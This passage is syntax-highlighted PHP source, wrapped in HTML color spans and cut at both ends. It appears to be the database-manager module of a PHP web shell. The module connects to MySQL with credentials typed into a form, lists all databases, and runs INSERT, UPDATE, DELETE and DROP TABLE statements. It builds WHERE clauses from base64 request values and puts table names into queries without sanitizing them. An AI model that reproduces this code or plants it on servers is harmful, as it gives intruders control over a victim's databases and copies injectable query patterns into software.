<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Database has success backup to &lt;a href="'</span>.$<span style="color: #f0c674;">fileurl</span>.<span style="color: #8abeb7;">'" target=</span><span style="color: #8abeb7; text-decoration: underline;">"_blank"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">path</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_close(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Backup failed'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">insert</span> &amp;&amp; $<span style="color: #f0c674;">insertsql</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">keystr</span> = $<span style="color: #f0c674;">valstr</span> = $<span style="color: #f0c674;">tmp</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">insertsql</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">key</span> =&gt; $<span style="color: #f0c674;">val</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">val</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">keystr</span> .= $<span style="color: #f0c674;">tmp</span><span style="color: #cc6666; font-weight: bold;">.</span>$<span style="color: #f0c674;">key</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">valstr</span> .= $<span style="color: #f0c674;">tmp</span>.<span style="color: #8abeb7;">"'"</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">addslashes(</span>$<span style="color: #f0c674;">val</span>).<span style="color: #8abeb7;">"'"</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tmp</span> = <span style="color: #8abeb7;">','</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">keystr</span> &amp;&amp; $<span style="color: #f0c674;">valstr</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mysqllink</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mydbconn(</span>$<span style="color: #f0c674;">dbhost</span>,$<span style="color: #f0c674;">dbuser</span>,$<span style="color: #f0c674;">dbpass</span>,$<span style="color: #f0c674;">dbname</span>,$<span style="color: #f0c674;">charset</span>,$<span style="color: #f0c674;">dbpo</span><span style="color: #f0c674; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(q(</span><span style="color: #8abeb7;">"INSERT INTO $tablename ($keystr) VALUES ($valstr)"</span>) ? <span style="color: #8abeb7;">'Insert n</span><span style="color: #8abeb7; text-decoration: underline;">ew record of success'</span><span style="text-decoration: underline;"> : </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">update</span> &amp;&amp; $<span style="color: #f0c674;">insertsql</span> &amp;&amp; $<span style="color: #f0c674;">base64</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">valstr</span> = $<span style="color: #f0c674;">tmp</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">insertsql</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">key</span> =&gt; $<span style="color: #f0c674;">val</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">valstr</span> .= $<span style="color: #f0c674;">tmp</span><span style="color: #cc6666; font-weight: bold;">.</span>$<span style="color: #f0c674;">key</span>.<span style="color: #8abeb7;">"='"</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">addslashes(</span>$<span style="color: #f0c674;">val</span>).<span style="color: #8abeb7;">"'"</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tmp</span> = <span style="color: #8abeb7;">','</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">valstr</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">where</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">base64_decode(</span>$<span style="color: #f0c674;">base64</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mysqllink</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mydbconn(</span>$<span style="color: #f0c674;">dbhost</span>,$<span style="color: #f0c674;">dbuser</span>,$<span style="color: #f0c674;">dbpass</span>,$<span style="color: #f0c674;">dbname</span>,$<span style="color: #f0c674;">charset</span>,$<span style="color: #f0c674;">dbpo</span><span style="color: #f0c674; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(q(</span><span style="color: #8abeb7;">"UPDATE $tablename SET $valstr WHERE $where LIMIT 1"</span>) ? <span style="color: #8abeb7;">'Record </span><span style="color: #8abeb7; text-decoration: underline;">updating'</span><span style="text-decoration: underline;"> : </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'del'</span> &amp;&amp; $<span style="color: #f0c674;">base64</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">where</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">base64_decode(</span>$<span style="color: #f0c674;">base64</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">delete_sql</span> = <span style="color: #8abeb7;">"DELETE FROM $tablename WHERE $where"</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mysqllink</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mydbconn(</span>$<span style="color: #f0c674;">dbhost</span>,$<span style="color: #f0c674;">dbuser</span>,$<span style="color: #f0c674;">dbpass</span>,$<span style="color: #f0c674;">dbname</span>,$<span style="color: #f0c674;">charset</span>,$<span style="color: #f0c674;">dbport</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(q(</span><span style="color: #8abeb7;">"DELETE FROM $tablename WHERE $where"</span>) ? <span style="color: #8abeb7;">'Deletion record of success</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;"> : </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">tablename</span> &amp;&amp; $<span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'drop'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mysqllink</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mydbconn(</span>$<span style="color: #f0c674;">dbhost</span>,$<span style="color: #f0c674;">dbuser</span>,$<span style="color: #f0c674;">dbpass</span>,$<span style="color: #f0c674;">dbname</span>,$<span style="color: #f0c674;">charset</span>,$<span style="color: #f0c674;">dbport</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"DROP TABLE $tablename"</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Drop table of success'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tablename</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(mysql_error(</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'MYSQL Manager'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'DBHost:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbhost'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">20</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">dbhost</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">':'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbport'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">4</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">dbport</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'DBUser:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbuser'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">15</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">dbuser</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'DBPass:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbpass'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">15</span>,<span style="color: #8abeb7;">'value'</span>=&gt;$<span style="color: #f0c674;">dbpass</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'DBCharset:'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeselect(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'charset'</span>,<span style="color: #8abeb7;">'option'</span>=&gt;$<span style="color: #f0c674;">charsetdb</span>,<span style="color: #8abeb7;">'selected'</span>=&gt;$<span style="color: #f0c674;">charset</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'nokey'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'connect'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #8abeb7;">'Connect'</span>,<span style="color: #8abeb7;">'type'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'class</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#25805;&#20316;&#35760;&#24405;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'recordlist'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'doing'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'base64'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'tablename'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span>$<span style="color: #f0c674;">dbform</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#36873;&#23450;&#25968;&#25454;&#24211;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'setdbname'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span>$<span style="color: #f0c674;">dbform</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (!$<span style="color: #f0c674;">dbname</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dbname'</span>);
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);

<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#36873;&#23450;&#34920;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'settable'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span>$<span style="color: #f0c674;">dbform</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'tablename'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'page'</span>,$<span style="color: #f0c674;">page</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'doing'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);

<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">cachetables</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);<span style="color: #cc6666; background-color: #373b41;">     </span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">pagenum</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">30</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">page</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">intval(</span>$<span style="color: #f0c674;">page</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">page</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">start_limit</span> = ($<span style="color: #f0c674;">page</span> - <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>) * $<span style="color: #f0c674;">pagenum</span>;
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">start_limit</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">page</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #f0c674;">dbhost</span>) &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #f0c674;">dbuser</span>) &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #f0c674;">dbpass</span>) &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #f0c674;">connect</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mysqllink</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mydbconn(</span>$<span style="color: #f0c674;">dbhost</span>, $<span style="color: #f0c674;">dbuser</span>, $<span style="color: #f0c674;">dbpass</span>, $<span style="color: #f0c674;">dbname</span>, $<span style="color: #f0c674;">charset</span>, $<span style="color: #f0c674;">dbp</span><span style="color: #f0c674; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#25968;&#25454;&#24211;&#20449;&#24687;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">mysqlver</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_get_server_info(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;MySQL '</span>.$<span style="color: #f0c674;">mysqlver</span>.<span style="color: #8abeb7;">' running in '</span>.$<span style="color: #f0c674;">dbhost</span>.<span style="color: #8abeb7;">' as '</span>.$<span style="color: #f0c674;">dbuser</span>.<span style="color: #8abeb7;">'@'</span>.$<span style="color: #f0c674;">dbhos</span><span style="color: #f0c674; text-decoration: underline;">t</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">highver</span> = $<span style="color: #f0c674;">mysqlver</span> &gt; <span style="color: #8abeb7;">'4.1'</span> ? <span style="color: #c5c8c6; background-color: #1d1f21;">1</span> : <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#25968;&#25454;&#24211;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">query</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"SHOW DATABASES"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dbs</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dbs</span>[] = <span style="color: #8abeb7;">'-- Select a database --'</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>($<span style="color: #f0c674;">db</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_fetch_array(</span>$<span style="color: #f0c674;">query</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dbs</span>[$<span style="color: #f0c674;">db</span>[<span style="color: #8abeb7;">'Database'</span>]] = $<span style="color: #f0c674;">db</span>[<span style="color: #8abeb7;">'Database'</span>];
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeselect(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Please select a database:'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'db[]'</span>,<span style="color: #8abeb7;">'op</span><span style="color: #8abeb7; text-decoration: underline;">tion'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #f0c674; text-decoration: underline;">dbs</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'selected'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #f0c674; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'onchange'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'moddbname(this.options[this.selectedIndex].value)'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tabledb</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">dbname</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'Current dababase: &lt;a href="javascript:moddbname(\''</span>.$<span style="color: #f0c674;">dbname</span>.<span style="color: #8abeb7;">'\');</span><span style="color: #8abeb7; text-decoration: underline;">"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">tablename</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">' | Current Table: &lt;a href="javascript:settable(\''</span>.$<span style="color: #f0c674;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt; [ &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'drop\');"&gt;Drop&lt;/a&gt; ]'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_select_db(</span>$<span style="color: #f0c674;">dbname</span>);

